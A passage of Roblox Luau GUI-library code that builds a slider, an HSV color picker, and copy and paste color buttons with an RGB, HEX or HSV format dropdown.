								local mouse = game.Players.LocalPlayer:GetMouse() 
								local val 
								Button2113132.MouseButton1Down:Connect(function() 
									Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
									val = (((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)or 0 
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
										end
											--print(val)
											--pri
									Value123123123.Text = val 
									Element.value.RainbowSpeed = val 
									--values[tabname][sectorname][text] = Element.Value123123123 
									--callback(Element.Value123123123) 
									moveconnection = mouse.Move:Connect(function() 
										Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
										val = (((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
										end
											--print(val)
											--pri
										Value123123123.Text = val 
										--RainbowSpeed = val 
										--values[tabname][sectorname][text] = Element.Value123123123 
										--callback(Element.Value123123123) 
									end) 
									releaseconnection = uis.InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
											val = (((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
										end
											--print(val)
											--pri
											--values[tabname][sectorname][text] = Element.Value123123123 
											--callback(Element.Value123123123) 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 							
								---------------------------------------------------------------------------------------------------------------------
								
								
								Colorpick.Name = "Colorpick" 
								Colorpick.Parent = Frame 
								Colorpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Colorpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Colorpick.ClipsDescendants = false 
								Colorpick.Position = C.UDIM2(0, 40, 0, 10) 
								Colorpick.Size = C.UDIM2(0, 150, 0, 150) 
								Colorpick.AutoButtonColor = false 
								Colorpick.Image = "rbxassetid://4155801252" 
								Colorpick.ImageColor3 = C.COL3RGB(255, 0, 0) 
								Colorpick.ZIndex = 4 

								ColorDrag.Name = "ColorDrag" 
								ColorDrag.Parent = Colorpick 
								ColorDrag.AnchorPoint = C.Vec2(0.5, 0.5) 
								ColorDrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ColorDrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								ColorDrag.Size = C.UDIM2(0, 4, 0, 4) 
								ColorDrag.ZIndex = 4

								Huepick.Name = "Huepick" 
								Huepick.Parent = Frame 
								Huepick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Huepick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Huepick.ClipsDescendants = false 
								Huepick.Position = C.UDIM2(0, 10, 0, 10) 
								Huepick.Size = C.UDIM2(0, 20, 0, 150) 
								Huepick.AutoButtonColor = false 
								Huepick.Image = "rbxassetid://3641079629" 
								Huepick.ImageColor3 = C.COL3RGB(255, 0, 0) 
								Huepick.ImageTransparency = 1 
								Huepick.BackgroundTransparency = 0 
								Huepick.ZIndex = 4

								local HueFrameGradient = C.INST("UIGradient") 
								HueFrameGradient.Rotation = 90 
								HueFrameGradient.Name = "HueFrameGradient" 
								HueFrameGradient.Parent = Huepick 
								HueFrameGradient.Color = ColorSequence.new { 
									ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 0, 0)), 
									ColorSequenceKeypoint.new(0.17, C.COL3RGB(255, 0, 255)), 
									ColorSequenceKeypoint.new(0.33, C.COL3RGB(0, 0, 255)), 
									ColorSequenceKeypoint.new(0.50, C.COL3RGB(0, 255, 255)), 
									ColorSequenceKeypoint.new(0.67, C.COL3RGB(0, 255, 0)), 
									ColorSequenceKeypoint.new(0.83, C.COL3RGB(255, 255, 0)), 
									ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 0, 0)) 
								}

								Huedrag.Name = "Huedrag" 
								Huedrag.Parent = Huepick 
								Huedrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Huedrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Huedrag.Size = C.UDIM2(1, 0, 0, 2) 
								Huedrag.ZIndex = 4

								ColorP.MouseButton1Down:Connect(function() 
									Frame.Visible = not Frame.Visible 
								end) 
								local abc = false 
								local inCP = false 
								ColorP.MouseEnter:Connect(function() 
									abc = true 
								end) 
								ColorP.MouseLeave:Connect(function() 
									abc = false 
								end) 
								Frame.MouseEnter:Connect(function() 
									inCP = true 
								end) 
								Frame.MouseLeave:Connect(function() 
									inCP = false 
								end) 

								ColorH = (C.CLAMP(Huedrag.AbsolutePosition.Y-Huepick.AbsolutePosition.Y, 0, Huepick.AbsoluteSize.Y)/Huepick.AbsoluteSize.Y) 
								ColorS = 1-(C.CLAMP(ColorDrag.AbsolutePosition.X-Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
								ColorV = 1-(C.CLAMP(ColorDrag.AbsolutePosition.Y-Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 

								if data.default and data.default.Color ~= nil then 
									Element.value.Color = data.default.Color
									ColorH, ColorS, ColorV = data.default.Color:ToHSV() 

									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 
									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									
									
									values[tabname][sectorname][text] = data.default.Color 
									--print(data.default.Color,Element.value.Color,text)
								elseif Element.value.Color ~= nil then
									ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 
									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 

									values[tabname][sectorname][text] = Element.value.Color 
								end
								

								local mouse = LocalPlayer:GetMouse() 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if not dragging and not abc and not inCP then 
											Frame.Visible = false 
										end 
									end 
								end) 

								local function updateColor() 
									local ColorX = (C.CLAMP(mouse.X - Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
									local ColorY = (C.CLAMP(mouse.Y - Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 
									ColorDrag.Position = C.UDIM2(ColorX, 0, ColorY, 0) 
									ColorS = 1-ColorX 
									ColorV = 1-ColorY 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									values[tabname][sectorname][text] = Element.value 
									Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(Element.value) 
								end 
								local function updateHue() 
									local y = C.CLAMP(mouse.Y - Huepick.AbsolutePosition.Y, 0, 148) 
									Huedrag.Position = C.UDIM2(0, 0, 0, y) 
									hue = y/148 
									ColorH = 1-hue 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									values[tabname][sectorname][text] = Element.value 
									Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(Element.value) 
								end 
								Colorpick.MouseButton1Down:Connect(function() 
									updateColor() 
									moveconnection = mouse.Move:Connect(function() 
										updateColor() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateColor() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
								Huepick.MouseButton1Down:Connect(function() 
									updateHue() 
									moveconnection = mouse.Move:Connect(function() 
										updateHue() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateHue() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 

								Button.MouseButton1Down:Connect(function() 
									Element.value.Toggle = not Element.value.Toggle 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 									
									update() 
								end) 
								if data.default then 
									update() 
								end 
								--print(data.default.Color ~= nil and deta.default.Color or ' ',Element.value.Color,text)

								values[tabname][sectorname][text] = Element.value 
								--print(Element.value.Color,text)
								if data.default and data.default.Color ~= nil then
												Element.value.Color = data.default.Color
												ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

												ColorH = C.CLAMP(ColorH,0,1) 
												ColorS = C.CLAMP(ColorS,0,1) 
												ColorV = C.CLAMP(ColorV,0,1) 
												ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
												Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

												ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
												Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
												values[tabname][sectorname][text] = Element.value 
												Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
												callback(Element.value) 								
								end
								function Element:SetValue(value) 
									Element.value = value 
									local duplicate = C.COL3(value.Color.R, value.Color.G, value.Color.B) 
									ColorH, ColorS, ColorV = duplicate:ToHSV() 
									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 

									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(value) 
									update() 
									update123()
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
								end
							elseif type == "ToggleTrans" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,16) 
								Element.value = {Rainbow = false, RainbowSpeed = 3,Toggle = data.default and data.default.Toggle or false, Color = data.default and data.default.Color or C.COL3RGB(255,255,255), Transparency = data.default and data.default.Transparency or 0} 

								local Toggle = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local Color = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								Button.Name = "Button" 
								Button.Parent = Toggle 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Size = C.UDIM2(1, 0, 1, 0) 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Color.Name = "Color" 
								Color.Parent = Button 
								Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Color.Position = C.UDIM2(0, 15, 0.5, -5) 
								Color.Size = C.UDIM2(0, 8, 0, 8) 

								TextLabel.Parent = Button; TextLabel.Name = 'CheckerINeed'
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local function update() 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = getMainColor()}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 

								local ColorH,ColorS,ColorV 

								local ColorP = C.INST("TextButton") 
								local Frame = C.INST("Frame") 
								local Colorpick = C.INST("ImageButton") 
								local ColorDrag = C.INST("Frame") 
								local Huepick = C.INST("ImageButton") 
								local Huedrag = C.INST("Frame") 

								ColorP.Name = "ColorP" 
								ColorP.Parent = Button 
								ColorP.AnchorPoint = C.Vec2(1, 0) 
								ColorP.BackgroundColor3 = C.COL3RGB(255, 0, 0) 
								ColorP.BorderColor3 = C.COL3RGB(18, 18, 16) 
								ColorP.Position = C.UDIM2(0, 270, 0.5, -4) 
								ColorP.Size = C.UDIM2(0, 18, 0, 8) 
								ColorP.AutoButtonColor = false 
								ColorP.Font = Enum.Font.Gotham 
								ColorP.Text = "" 
								ColorP.TextColor3 = C.COL3RGB(200, 200, 200) 
								ColorP.TextSize = 11.000

								Frame.Parent = ColorP 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(-0.666666687, -170, 1.375, 0) 
								Frame.Size = C.UDIM2(0, 200, 0, 300) --edit here
								Frame.Visible = false 
								Frame.ZIndex = 3 

								local Button5 = C.INST("Frame") 
								local Button_25 = C.INST("TextButton") 
								local TextLabel5 = C.INST("TextLabel") 

								Button5.Name = "Button" 
								Button5.Parent = Frame 
								Button5.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button5.BackgroundTransparency = 1.000 
								Button5.Position = C.UDIM2(0, -20, 0, 190) --edit here
								Button5.Size = C.UDIM2(1, 0, 0, 15) 
								Button5.ZIndex = 3

								Button_25.Name = "Button" 
								Button_25.Parent = Button5
								Button_25.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_25.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_25.Position = C.UDIM2(0, 30, 0.5, -9)
								Button_25.Size = C.UDIM2(0, 175, 0, 18) 
								Button_25.AutoButtonColor = false 
								Button_25.Font = Enum.Font.SourceSans 
								Button_25.Text = "" 
								Button_25.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_25.TextSize = 11.000
								Button_25.ZIndex = 3

								TextLabel5.Parent = Button_25
								TextLabel5.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel5.BackgroundTransparency = 1.000 
								TextLabel5.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel5.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel5.Font = Enum.Font.Gotham 
								TextLabel5.Text = 'Copy colors' 
								TextLabel5.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel5.TextSize = 11.000
								TextLabel5.ZIndex = 3

							CopyColorsType = 'RGB'
								Button_25.MouseButton1Down:Connect(function() 
									TextLabel5.TextColor3 = getMainColor() 
									library:Tween(TextLabel5, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								local retarded, lmao = pcall(function()
								local l,m,a = C.FLOOR((Element.value.Color.R*255)+0.5),C.FLOOR((Element.value.Color.G*255)+0.5),C.FLOOR((Element.value.Color.B*255)+0.5)
									if CopyColorsType == 'RGB' then
										setclipboard(''..l..','..m..','..a) -- o
									elseif CopyColorsType == 'HEX' then
										setclipboard(C.COL3RGB(l,m,a):ToHex())
									elseif CopyColorsType == 'HSV' then 
										local H,S,V = C.COL3(l,m,a):ToHSV() --hsl, cmyk
										setclipboard(''..H..','..S..','..V)
										end
									end)
									if retarded then
									TextLabel5.Text = 'Success!'
									wait(1.5)
									TextLabel5.Text = 'Copy colors'
									else
										TextLabel5.Text = 'Error!'
										wait(1.5)
										TextLabel5.Text = 'Copy colors'
										print(lmao)
										print(Element.value.Color)
										print(Element.value.Color.value)
									end
								end) 
								Button_25.MouseEnter:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_25.MouseLeave:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end) 

									do
									--Element.value = {Dropdown = data.options[1]} 

									local Dropdown = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 
									local Drop = C.INST("ScrollingFrame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel_2 = C.INST("TextLabel") 
									local UIListLayout = C.INST("UIListLayout") 
									local ImageLabel = C.INST("ImageLabel") 
									local TextLabel_3 = C.INST("TextLabel") 
									--Frame.Size = C.UDIM2(0,200,270)
									Dropdown.Name = "Dropdown" 
									Dropdown.Parent = Frame 
									Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Dropdown.BackgroundTransparency = 1.000 
									Dropdown.Position = C.UDIM2(0, -20, 0, 208) 
									Dropdown.Size = C.UDIM2(1, 0, 0, 39) 
									Dropdown.ZIndex = 4

									Button.Name = "Button" 
									Button.Parent = Dropdown 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(0, 175, 0, 17) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000
									Button.ZIndex = 4

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
									TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = 'RGB'
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel.ZIndex = 4

									local abcd = TextLabel 

									Drop.Name = "Drop" 
									Drop.Parent = Button 
									Drop.Active = true 
									Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Drop.Position = C.UDIM2(0, 0, 1, 1) 
									Drop.Size = C.UDIM2(1, 0, 0, 20) 
									Drop.Visible = false 
									Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
									Drop.ScrollBarThickness = 4 
									Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.AutomaticCanvasSize = "Y" 
									Drop.ZIndex = 5 
									Drop.ScrollBarImageColor3 = getMainColor() 

									UIListLayout.Parent = Drop 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder --DROPDOWN COPY COLORS
									local table = {'RGB', 'HSV', 'HEX'}
									local num = #table 
									if num > 5 then 
										Drop.Size = C.UDIM2(1, 0, 0, 85) 
									else 
										Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
									end 
									local first = true 
									for i,v in ipairs(table) do 
										do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Drop 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
											Button.Size = C.UDIM2(0, 175, 0, 17) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000
											Button.BorderSizePixel = 0 
											Button.ZIndex = 6 

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
											TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											TextLabel.ZIndex = 6 

											Button.MouseButton1Down:Connect(function() 
												Drop.Visible = false 
												--Element.value.Dropdown = v 
												CopyColorsType = v
												abcd.Text = v 
												--values[tabname][sectorname][text] = Element.value 
												--callback(Element.value) 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end) 
											Button.MouseEnter:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  getMainColor()}) 
											end) 
											Button.MouseLeave:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
											end) 

											first = false 
										end 
									end

									ImageLabel.Parent = Button 
									ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ImageLabel.BackgroundTransparency = 1.000 
									ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
									ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
									ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 
									ImageLabel.ZIndex = 4

									TextLabel_3.Parent = Dropdown 
									TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel_3.BackgroundTransparency = 1.000 
									TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
									TextLabel_3.Font = Enum.Font.Gotham 
									TextLabel_3.Text = 'Copy colors type' 
									TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.TextSize = 11.000
									TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel_3.ZIndex = 4

									Button.MouseButton1Down:Connect(function() 
										Drop.Visible = not Drop.Visible 
										if not Drop.Visible then 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end) 
									local indrop = false 
									local ind = false 
									Drop.MouseEnter:Connect(function() 
										indrop = true 
									end) 
									Drop.MouseLeave:Connect(function() 
										indrop = false 
									end) 
									Button.MouseEnter:Connect(function() 
										ind = true 
									end) 
									Button.MouseLeave:Connect(function() 
										ind = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if Drop.Visible == true and not indrop and not ind then 
												Drop.Visible = false 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end 
										end 
									end) 								
								end





								local Button35 = C.INST("Frame") 
								local Button_325 = C.INST("TextButton") 
								local TextLabel35 = C.INST("TextLabel") 

								Button35.Name = "Button" 
								Button35.Parent = Frame 
								Button35.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button35.BackgroundTransparency = 1.000 
								Button35.Position = C.UDIM2(0, -20, 0, 247) --edit here
								Button35.Size = C.UDIM2(1, 0, 0, 15) 
								Button35.ZIndex = 4

								Button_325.Name = "Button" 
								Button_325.Parent = Button35
								Button_325.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_325.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_325.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_325.Size = C.UDIM2(0, 175, 0, 18) 
								Button_325.AutoButtonColor = false 
								Button_325.Font = Enum.Font.SourceSans 
								Button_325.Text = "" 
								Button_325.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_325.TextSize = 11.000
								Button_325.ZIndex = 4

								TextLabel35.Parent = Button_325
								TextLabel35.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel35.BackgroundTransparency = 1.000 
								TextLabel35.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel35.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel35.Font = Enum.Font.Gotham 
								TextLabel35.Text = 'Paste colors' 
								TextLabel35.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel35.TextSize = 11.000
								TextLabel35.ZIndex = 4

									

									
								Button_325.MouseButton1Down:Connect(function() 
									TextLabel35.TextColor3 = getMainColor() 
									library:Tween(TextLabel35, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									local clipboard = getclipboard()
									local colors = string.split(clipboard, ',')
									local IsAColor = false
									local WhatKindOfColor = ''
									if pcall(function() return C.COL3HSV(clipboard:gsub('#','')) end) then
										IsAColor = true
										WhatKindOfColor = 'HEX'
									elseif #colors == 3 and (tonumber(colors[1]) and tonumber(colors[1]) <= 256 and tonumber(colors[1]) >= -1) and (tonumber(colors[2]) and tonumber(colors[2]) <= 256 and tonumber(colors[2]) >= -1) and (tonumber(colors[3]) and tonumber(colors[3]) <= 256 and tonumber(colors[3]) >= -1) then
										IsAColor = true
										WhatKindOfColor = 'RGB'
									end
									
									
									if IsAColor then
										local retarded, lmao = pcall(function()
											if WhatKindOfColor == 'RGB' then
												Element.value.Color = C.COL3RGB(colors[1],colors[2],colors[3])
											elseif WhatKindOfColor == 'HEX' then
												Element.value.Color = C.COL3HEX(clipboard:gsub('#',''))
											end
											ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

											ColorH = C.CLAMP(ColorH,0,1) 
											ColorS = C.CLAMP(ColorS,0,1) 
											ColorV = C.CLAMP(ColorV,0,1) 
											ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
											Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
											
											ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
											Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
											values[tabname][sectorname][text] = Element.value 
											Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
											callback(Element.value) 
										end)
											if retarded then
												TextLabel35.Text = 'Success!'
												wait(1.5)
												TextLabel35.Text = 'Paste colors'
											else
												TextLabel35.Text = 'Error!'
												wait(1.5)
												TextLabel35.Text = 'Paste colors'
												print(lmao)
											end
									else
										TextLabel35.Text = 'Not a color'
										wait(1.5)
										TextLabel35.Text = "Paste colors"
									end
								end)
								Button_325.MouseEnter:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_325.MouseLeave:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)
							
								
								
								
								
								-------------------------------------------------------------------

									local Toggle123 = C.INST("Frame") 
									local Button123 = C.INST("TextButton") 
									local Color123 = C.INST("Frame") 
									local TextLabel123 = C.INST("TextLabel") 							
									Toggle123.Name = "Toggle123" 
									Toggle123.Parent = Frame 
